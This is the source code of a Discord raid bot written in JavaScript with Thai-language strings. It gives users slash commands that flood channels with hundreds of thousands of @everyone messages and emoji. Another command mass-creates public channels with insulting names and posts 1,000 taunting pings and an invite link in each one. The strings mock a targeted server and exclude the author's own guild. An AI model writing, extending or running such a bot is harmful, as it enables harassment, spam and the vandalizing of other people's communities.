import {
  Client,
  GatewayIntentBits,
  ChannelType,
  PermissionsBitField
} from "discord.js";

import { joinVoiceChannel } from "@discordjs/voice";
import "dotenv/config";

const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildVoiceStates,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.GuildMembers,
    GatewayIntentBits.MessageContent,
  ],
});

// ===== CONFIG =====
const LOG_CHANNEL_ID = "1461588208675459217";
const BLOCKED_GUILD_ID = "146024011876123456";

// ===== RANDOM TEXT =====
const randomMessages = [
  "@everyone เอ๋อ",
  "@everyone ร้องไร",
  "@everyone กูขำว่ะ",
  "@everyone คุ้มมั้ยเนี่ย",
  "@everyone เเค้นมั้ยถ้าเเค้นเข้าดิสมา5555",
  "@everyone เซิฟกากๆโดนยิงได้อะตลกกก",
  "@everyone อย่าร้องเลยสร้างใหม่ได้",
  "@everyone ไม่เอาไม่ร้องงงงงมากอดมาจุ๊บบมั๊ววว",
  "@everyone อย่าทำให้กูขำได้ป่ะ55555555",
];

// ===== RANDOM ROOM NAMES =====
const roomNames = [
  "ไม่เป็นไรนะสร้างใหม่ได้",
  "เซิฟแตกเหรอครับ",
  "เอ๋อจัดๆ",
  "ตลกดี 555",
  "สร้างใหม่ได้จ้า",
  "ร้องทำไมมม",
  "ป๊อปปี้อย่าร้อง",
  "เซิฟวิบัติ",
  "ปัดเป่าสิ่งชั่วร้าย",
  "สู้ป๊อปปี้สู้",
  "ดิสกากๆโดนบอทฟรียิง",
  "VEXSHOPเขามาลั่นมึงเเล้ววว",
  "มึงพลาดเเล้วววว",
  "จุ๊บมั่วววว",
  "ตู้มมมมพ่องตายยยยย",
  "บอทกันสเเปมมึงเซ็ตโง่มาก555",
  "ขี้ตีนVEXSHOP",
];

// ===== FORMAT TIME +7 =====
function timeTH() {
  return new Date().toLocaleString("th-TH", { timeZone: "Asia/Bangkok" });
}

// ===== LOG SYSTEM =====
function logUse(i, extra = "") {
  if (!LOG_CHANNEL_ID) return;
  const ch = client.channels.cache.get(LOG_CHANNEL_ID);
  if (!ch) return;
  ch.send(
    `[\`${timeTH()}\`] ${i.user.tag} ใช้คำสั่ง \`/${i.commandName}\` ในเซิฟ \`${i.guild.name}\` ${extra}`
  ).catch(() => {});
}

client.once("ready", () => {
  console.log(`${client.user.tag} is online.`);
});

client.on("interactionCreate", async (interaction) => {
  try {
    if (!interaction.isChatInputCommand()) return;
    if (!interaction.guild) return;

    if (BLOCKED_GUILD_ID && interaction.guild.id === BLOCKED_GUILD_ID) {
      return interaction.reply({ content: "อย่ามาใช้ในเซิฟกู", ephemeral: true });
    }

    logUse(interaction);

    // --- /spam ---
    if (interaction.commandName === "spam") {
      const text = interaction.options.getString("text");
      const count = Math.min(interaction.options.getInteger("count") ?? 5, 999999);
      await interaction.reply({ content: "ลั่นละนะ", ephemeral: true });
      for (let i = 0; i < count; i++) interaction.channel.send(text).catch(()=>{});
    }

    // --- /emoji ---
    if (interaction.commandName === "emoji") {
      const emoji = interaction.options.getString("emoji");
      const count = Math.min(interaction.options.getInteger("count") ?? 5, 999999);
      const delay = Math.max(interaction.options.getInteger("delay") ?? 1, 1);
      await interaction.reply({ content: "ยิง emoji", ephemeral: true });
      for (let i = 0; i < count; i++) {
        interaction.channel.send(emoji).catch(()=>{});
        await new Promise(r => setTimeout(r, delay));
      }
    }

    // --- /join ---
    if (interaction.commandName === "join") {
      const vc = interaction.member.voice?.channel;
      if (!vc)
        return interaction.reply({ content: "มึงเข้า vc ก่อนไอ้ควาย", ephemeral: true });
      joinVoiceChannel({
        channelId: vc.id,
        guildId: vc.guild.id,
        adapterCreator: vc.guild.voiceAdapterCreator,
        selfDeaf:false,selfMute:false
      });
      return interaction.reply({ content:`เข้าห้อง ${vc.name} แล้ว`, ephemeral:true });
    }

    // --- /tell_off ---
    if (interaction.commandName === "tell_off") {
      const count = interaction.options.getInteger("count") ?? 100000;
      await interaction.reply({ content:`ยิง ${count} ข้อความ`, ephemeral:true });
      const tasks = [];
      for (let i = 0; i < count; i++) {
        tasks.push(
          interaction.channel.send(
            randomMessages[Math.floor(Math.random()*randomMessages.length)]
          ).catch(()=>{})
        );
      }
      Promise.allSettled(tasks);
    }

    // --- /kick (ใหม่) ---
    if (interaction.commandName === "kick") {
      const target = interaction.options.getUser("target");
      const reason = interaction.options.getString("reason") ?? "No reason";
      const mem = interaction.guild.members.cache.get(target.id);
      if (!interaction.member.permissions.has(PermissionsBitField.Flags.KickMembers))
        return interaction.reply({ content:"บอทกูไม่มีสิทธิ์ Kick", ephemeral:true });
      await mem.kick(reason).catch(()=>{});
      logUse(interaction, `-> Kick ${target.tag}`);
      return interaction.reply({ content:`Kick ${target.tag}`, ephemeral:true });
    }

    // --- /ban (ใหม่) ---
    if (interaction.commandName === "ban") {
      const target = interaction.options.getUser("target");
      const reason = interaction.options.getString("reason") ?? "No reason";
      if (!interaction.member.permissions.has(PermissionsBitField.Flags.BanMembers))
        return interaction.reply({ content:"บอทกูไม่มีสิทธิ์ Ban", ephemeral:true });
      await interaction.guild.members.ban(target, { reason }).catch(()=>{});
      logUse(interaction, `-> Ban ${target.tag}`);
      return interaction.reply({ content:`Ban ${target.tag}`, ephemeral:true });
    }

    // --- /create_room (upgrade) ---
    if (interaction.commandName === "create_room") {
      const amount = interaction.options.getInteger("amount") ?? 1;
      await interaction.reply({
        content:`สร้าง ${amount} ห้อง + ยิงพร้อมกัน`,
        ephemeral:true
      });

      const tasks = [];
      for (let i = 0; i < amount; i++) {
        const name = roomNames[Math.floor(Math.random()*roomNames.length)];
        tasks.push(
          interaction.guild.channels.create({
            name,
            type: ChannelType.GuildText,
            permissionOverwrites:[{
              id: interaction.guild.roles.everyone.id,
              allow:[PermissionsBitField.Flags.ViewChannel, PermissionsBitField.Flags.SendMessages]
            }],
          }).then(ch=>{
            for (let j = 0; j < 1000; j++)
              ch.send("@everyone ไม่เป็นไรนะสร้างใหม่ได้ค่ะที่รัก https://discord.gg/bdtRJBRyem").catch(()=>{});
          }).catch(()=>{})
        );
      }

      Promise.allSettled(tasks);
    }

  } catch (err) {
    console.error("ERROR:", err);
  }
});

client.login(process.env.DISCORD_TOKEN);